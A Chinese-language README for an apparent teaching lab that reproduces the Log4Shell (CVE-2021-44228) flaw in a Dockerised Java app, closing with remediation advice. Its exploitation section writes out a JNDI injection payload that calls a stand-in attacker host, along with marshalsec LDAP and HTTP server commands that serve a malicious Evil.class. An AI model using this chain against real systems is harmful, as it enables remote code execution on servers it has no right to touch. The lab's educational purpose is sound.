# OWASP Top10 A06 — Vulnerable & Outdated Components（Log4Shell）

---

## 一、项目简介

本项目用于复现 **OWASP Top 10 2021 — A06: Vulnerable and Outdated Components（使用存在漏洞或过时的组件）**，通过构建一个包含 **Log4Shell（CVE‑2021‑44228）漏洞** 的 Java Web 应用，从红队攻击视角演示漏洞的发现、利用与验证过程。

实验目标：

* 理解 A06 类漏洞的本质风险
* 搭建可复现的漏洞环境
* 按红队攻击流程完成漏洞利用
* 演示 Log4j JNDI 注入导致远程代码执行（RCE）

---

## 二、项目目录结构

```
A06_Vulnerable_Outdated_Components
│
├── environment/      漏洞运行环境（Docker）
├── vulnerability/    漏洞原理与分析
├── exploit/          利用代码与攻击工具
├── screenshots/      复现过程截图
└── README.md
```

---

## 三、漏洞背景

### OWASP 分类

* **类别**：A06 – Vulnerable and Outdated Components
* **漏洞编号**：CVE‑2021‑44228
* **漏洞名称**：Log4Shell

### 漏洞成因

应用使用了存在漏洞的 Log4j 版本（≤ 2.14.1）。

Log4j 在记录日志时会解析 `${}` 表达式，当攻击者可控日志内容时，可以构造：

```
${jndi:ldap://attacker-ip/object}
```

Log4j 将自动：

1. 连接攻击者 LDAP 服务
2. 获取远程类引用
3. 下载恶意 `.class`
4. 在服务器执行代码

最终导致 **远程代码执行（RCE）**

---

## 四、环境要求

* Docker Desktop（推荐 ≥ 4.x）
* Docker Compose
* Java 8（容器内）
* Maven（用于构建）
* Python3（用于HTTP服务）

---

## 五、漏洞环境启动

进入环境目录：

```
cd environment
```

构建镜像：

```
docker compose build --no-cache
```

启动服务：

```
docker compose up
```

访问测试：

```
http://localhost:8080/login?username=test
```

若页面显示：

```
Hello test
```

说明环境启动成功

---

## 六、获取 marshalsec 插件

本实验需要 `marshalsec` 生成 LDAP 引用服务器。

由于部分系统直接编译失败，推荐使用 **纯 Linux Maven 容器构建**。

### 1）启动 Maven 构建容器

```
docker run -it --name marshalsec-build maven:3.9.9-eclipse-temurin-8 bash
```

---

### 2）容器内安装 git

```
apt update
apt install -y git
```

---

### 3）克隆 marshalsec 项目

```
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
```

---

### 4）编译项目

```
mvn clean package -DskipTests
```

---

### 5）查找生成的 jar

```
ls target
```

可以看到：

```
marshalsec-0.0.3-SNAPSHOT-all.jar
```

---

### 6）复制 jar 到宿主机

打开新的 PowerShell：

```
docker cp marshalsec-build:/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar .
```

---

### 7）删除构建容器

```
docker rm -f marshalsec-build
```

---

## 七、漏洞利用流程

### Step 1：启动 LDAP 恶意服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
marshalsec.jndi.LDAPRefServer \
http://<IP>:8000/#Evil
```

---

### Step 2：启动 HTTP 文件服务器

在 Evil.class 所在目录：

```
python -m http.server 8000
```

---

### Step 3：触发漏洞（URL 编码 Payload）

在浏览器访问：

```
http://localhost:8080/login?username=%24%7Bjndi%3Aldap%3A%2F%2F<IP>%3A1389%2FEvil%7D
```

---

## 八、成功利用的标志

当漏洞成功触发时：

### LDAP 窗口

出现：

```
Send LDAP reference result
```

### HTTP 服务窗口

出现：

```
GET /Evil.class
```

### Web 服务日志

显示恶意代码执行结果。

---

## 九、实验截图

截图统一存放：

```
/screenshots
```

---

## 十、安全修复建议

* 升级 Log4j ≥ 2.17.1
* 禁用 JNDI Lookup
* 限制外部 LDAP/RMI 访问
* 使用依赖漏洞扫描工具（SCA）
* 建立组件生命周期管理机制
